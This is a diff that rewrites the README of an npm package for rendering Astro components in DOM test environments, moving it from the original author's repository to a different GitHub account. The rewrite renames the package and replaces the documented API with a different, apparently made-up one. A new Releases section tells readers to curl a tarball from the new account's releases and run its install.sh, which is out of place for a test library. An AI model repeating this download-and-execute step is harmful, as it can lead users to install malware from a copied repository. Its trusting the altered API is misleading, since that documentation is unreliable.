@@ -1,131 +1,216 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/igorskyflyer/npm-astro-render-component/main/assets/astro-render-component.png" alt="Icon of Astro Render Component" width="256" height="256">
-<h1 align="center">Astro Render Component</h1>
-</div>
+[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/jassaaaaa/npm-astro-render-component/releases)
 
-<br>
+# Fast Astro Component Renderer for DOM Testing Environments Now
 
-<div align="center">
-  🤖 Plug-and-play Astro component renderer for fast, zero-config testing in any DOM-like JS/TS environment. 🐬
-</div>
+🤖 Plug-and-play Astro component renderer for fast, zero-config testing in any DOM-like JS/TS environment.  
+Use with happy-dom, jsdom, or any VDOM-capable runtime to run server-side Astro components inside tests and scripts.
 
-<br>
-<br>
+[![npm version](https://img.shields.io/npm/v/npm-astro-render-component.svg)](https://www.npmjs.com/package/npm-astro-render-component) [![License](https://img.shields.io/github/license/jassaaaaa/npm-astro-render-component)](https://github.com/jassaaaaa/npm-astro-render-component/blob/main/LICENSE)  
+Topics: astro · back-end · component · dom · framework · front-end · happy-dom · happydom · igorskyflyer · jsdom · render · test · ui · vdom
 
-## 📃 Table of Contents
+Hero image  
+![Astro + DOM testing](https://img.shields.io/badge/Astro-Renderer-4c8?style=for-the-badge&logo=astro)
 
-- [Features](#-features)
-- [Usage](#-usage)
-- [Example](#️-example)
-- [Changelog](#-changelog)
-- [Support](#-support)
-- [License](#-license)
-- [Related](#-related)
-- [Author](#-author)
+Table of contents
+- Features
+- Install
+- Quick start
+- API
+- Examples
+- Integrations
+- Testing strategies
+- Performance notes
+- Troubleshooting
+- Releases
+- Contributing
+- License
 
----
+Features
+- Render Astro components inside any DOM-like JS/TS environment.
+- Zero config. No build step. No SSR server.
+- Works with happy-dom and jsdom in Node test runners.
+- TypeScript aware. Use .astro, .tsx and .jsx components.
+- Snapshot-friendly output. Clean HTML strings and DOM nodes.
+- Small runtime with minimal dependencies.
+- Designed for test suites and CI.
 
-## 🤖 Features
-
-- 🔧 Server-side rendering of Astro components in non-Astro environments like Vitest or Node.js
-- 🧪 Test-friendly API for rendering `.astro` components with props, slots, and hydration strategies
-- 🪄 Zero-config usage—just import and render, no need for full Astro setup
-- 🧩 Supports static, lazy, and client-only hydration modes
-- 🧠 Typed API with JSDoc annotations for IntelliSense and DX-first workflows
-- 🕸️ Compatible with Astro v5+, leveraging the experimental [AstroContainer API](https://docs.astro.build/en/reference/container-reference/)
-- 🚀 Ideal for unit and integration testing of UI components
-
----
-
-## 🕵🏼 Usage
-
-Install the package using your favorite package manager:
-
+Install
+- With npm:
 ```bash
-npm install "@igor.dvlpr/astro-render-component"
-# or
-pnpm add "@igor.dvlpr/astro-render-component"
-# or
-yarn add "@igor.dvlpr/astro-render-component"
-```  
-
-Bring your own testing framework, e.g. [Vitest](https://vitest.dev/) and your own DOM-like environment, e.g. [Happy-Dom](https://www.npmjs.com/package/happy-dom) and start rendering your Astro components in order to test them.
-
----
-
-## 🗒️ Example
-
-```ts
-// @​vitest-environment happy-dom
-import { renderAstroComponent } from '@igor.dvlpr/astro-render-component'
-import MyComponent from '../components/MyComponent.astro'
-import { expect } from 'vitest'
-
-const fragment = await renderAstroComponent(MyComponent, { props: { title: 'Hello' } })
-expect(fragment.querySelector('h1')?.textContent).toBe('Hello')
+npm install --save-dev npm-astro-render-component
+```
+- With yarn:
+```bash
+yarn add --dev npm-astro-render-component
+```
+- With pnpm:
+```bash
+pnpm add -D npm-astro-render-component
 ```
 
----
+Quick start
+- Basic usage in a Node test file. This example uses happy-dom:
+```js
+import { renderAstro } from 'npm-astro-render-component';
+import { Window } from 'happy-dom';
 
-## 📝 Changelog
+// Prepare DOM
+const window = new Window();
+global.window = window;
+global.document = window.document;
 
-📑 The changelog is available here: [CHANGELOG.md](https://github.com/igorskyflyer/npm-astro-render-component/blob/main/CHANGELOG.md).
+// Render
+const html = await renderAstro({
+  entry: './test/components/MyComponent.astro',
+  props: { title: 'Hello' },
+});
 
----
+console.log(html);
+// => returns HTML string or a DOM node depending on mode
+```
 
-## 🪪 License
+Design ideas
+- The package loads, compiles, and evaluates Astro components in-process.
+- It uses a minimal Astro runtime shim and a DOM adapter to mount output.
+- You get an HTML string or a DOM tree for assertions.
 
-Licensed under the MIT license which is available here, [MIT license](https://github.com/igorskyflyer/npm-astro-render-component/blob/main/LICENSE.txt).
+Modes
+- html: return a string of HTML
+- node: return a DOM node or DocumentFragment
+- hydrate: run client scripts in a supplied DOM runtime (if supported)
 
----
+API
+- renderAstro(options): Promise<string | Node | DocumentFragment>
 
-## 💖 Support
+Options
+- entry (string) — Path to the .astro component file or an importable module.
+- props (object) — Props to pass to the component.
+- mode ('html' | 'node' | 'hydrate') — Output mode. Default: 'html'.
+- domRuntime (object) — Optional DOM runtime (window/document). If not provided, the package will try to create a safe DOM using happy-dom.
+- compilerOptions (object) — Options passed to the internal compiler (babel/esbuild-like flags).
+- debug (boolean) — Output verbose logs for troubleshooting. Default: false.
 
-<div align="center">
-  I work hard for every project, including this one and your support means a lot to me!
-  <br>
-  Consider buying me a coffee. ☕
-  <br>
-  <br>
-  <a href="https://ko-fi.com/igorskyflyer" target="_blank"><img src="https://raw.githubusercontent.com/igorskyflyer/igorskyflyer/main/assets/ko-fi.png" alt="Donate to igorskyflyer" width="180" height="46"></a>
-  <br>
-  <br>
-  <em>Thank you for supporting my efforts!</em> 🙏😊
-</div>
+Examples
 
----
+1) Render to HTML string (Jest)
+```js
+import { renderAstro } from 'npm-astro-render-component';
 
-## 🧬 Related
+test('renders title', async () => {
+  const html = await renderAstro({
+    entry: './components/TestTitle.astro',
+    props: { title: 'Test' },
+    mode: 'html',
+  });
 
-[@igor.dvlpr/astro-easynav-button](https://www.npmjs.com/package/@igor.dvlpr/astro-easynav-button)
+  expect(html).toContain('<h1>Test</h1>');
+});
+```
 
-> _🧭 Add an easy-to-use navigational button (jump to top/bottom) to your Astro site. 🔼_
+2) Render to DOM node (Mocha + happy-dom)
+```js
+import { renderAstro } from 'npm-astro-render-component';
+import { Window } from 'happy-dom';
 
-<br>
+const window = new Window();
+global.window = window;
+global.document = window.document;
 
-[@igor.dvlpr/astro-post-excerpt](https://www.npmjs.com/package/@igor.dvlpr/astro-post-excerpt)
+it('mounts as DOM', async () => {
+  const node = await renderAstro({
+    entry: './components/Card.astro',
+    props: { body: 'Body content' },
+    mode: 'node',
+    domRuntime: { window, document },
+  });
 
-> _⭐ An Astro component that renders post excerpts for your Astro blog - directly from your Markdown and MDX files. Astro v2+ collections are supported as well! 💎_
+  const body = node.querySelector('.card-body').textContent;
+  assert.strictEqual(body, 'Body content');
+});
+```
 
-<br>
+3) Hydrate client script inside test (experimental)
+```js
+const fragment = await renderAstro({
+  entry: './components/Counter.astro',
+  props: { start: 0 },
+  mode: 'hydrate',
+  domRuntime: { window, document },
+});
 
-[@igor.dvlpr/chars-in-string](https://www.npmjs.com/package/@igor.dvlpr/chars-in-string)
+// locate internal counter element and assert initial value
+const counter = fragment.querySelector('.counter');
+expect(counter.textContent).toBe('0');
 
-> _🪐 Provides ways of testing whether an array of chars is present inside a given String. ☄_
+// simulate a click that triggers client behavior
+counter.querySelector('button').dispatchEvent(new window.Event('click'));
+expect(counter.textContent).toBe('1');
+```
 
-<br>
+Integrations
+- happy-dom: recommended for fast DOM API in tests. Use Window from happy-dom for global setup.
+- jsdom: supported if you prefer jsdom as your DOM runtime.
+- Test runners: Jest, Mocha, Vitest. Use adapter code to inject global window/document.
+- CI: Works inside Node-based CI providers. Keep memory and worker counts reasonable for large suites.
 
-[@igor.dvlpr/magic-queryselector](https://www.npmjs.com/package/@igor.dvlpr/magic-queryselector)
+Testing strategies
+- For UI assertions, prefer DOM mode to use querySelector and node traversal.
+- For snapshot testing, use HTML mode. It returns compact markup suitable for snapshots.
+- For client behavior, use hydrate mode with a DOM runtime that supports events and timers.
+- When testing multiple components, set up a shared DOM runtime in beforeAll/afterAll hooks to save time.
 
-> _🪄 A TypeScript-types patch for querySelector/querySelectorAll, make them return types you expect them to! 🔮_
+Performance notes
+- The package compiles components on demand. The first render pays the compile cost.
+- Use a test setup step to compile frequently used components once.
+- Cache compiled artifacts by enabling a cache directory via compilerOptions.
+- If tests run in parallel, configure per-worker cache paths to avoid race conditions.
 
-<br>
+Troubleshooting
+- If you see missing globals, set global.window and global.document with your chosen DOM runtime.
+- If a component imports assets (CSS, images), mock those imports in your test setup.
+- If a third-party script expects a browser API, use hydrate mode with a richer DOM runtime or mock required functions.
+- If rendering fails due to ES syntax, ensure your test environment supports modern ESM or use the internal compilerOptions to transform code.
 
-[@igor.dvlpr/vscode-folderpicker](https://www.npmjs.com/package/@igor.dvlpr/vscode-folderpicker)
+Security
+- The renderer executes component code inside the Node process. Audit third-party components before running untrusted code.
+- For CI, run tests in isolated environments or use container sandboxes.
 
-> _✨ Provides a custom Folder Picker API + UI for Visual Studio Code. 🎨_
+Releases
+- Download and execute the release asset from the Releases page: https://github.com/jassaaaaa/npm-astro-render-component/releases  
+  Find the build tarball or install script there. Download the file and execute it to run the packaged binary or installer. Example:
+```bash
+# Example flow (replace with the actual release asset name)
+curl -L -o astro-render.tar.gz https://github.com/jassaaaaa/npm-astro-render-component/releases/download/vX.Y.Z/astro-render.tar.gz
+tar -xzf astro-render.tar.gz
+./install.sh
+```
+- If the release link is unavailable for any reason, check the Releases section on GitHub for the latest assets and installation notes: https://github.com/jassaaaaa/npm-astro-render-component/releases
 
----
+Example project layout
+- src/
+  - components/
+    - Button.astro
+  - tests/
+    - Button.test.js
+- vite.config.js (optional)
+- package.json
+- tsconfig.json
 
-## 👨🏻‍💻 Author
-Created by **Igor Dimitrijević** ([*@igorskyflyer*](https://github.com/igorskyflyer/)).
+CI tips
+- Cache node_modules and compiler cache directories.
+- Use a dedicated step to precompile large component sets.
+- Run tests with limited concurrency to reduce memory pressure.
+
+Contributing
+- Fork the repo and open a pull request.
+- Follow the commit style and add tests for new features.
+- Run the test suite locally before submitting.
+
+Maintainers
+- igorskyflyer and project contributors (see Git history for details).
+
+License
+- MIT
+
+Links
+- Releases: [![Releases](https://img.shields.io/badge/Releases-Visit-blue?logo=github)](https://github.com/jassaaaaa/npm-astro-render-component/releases)
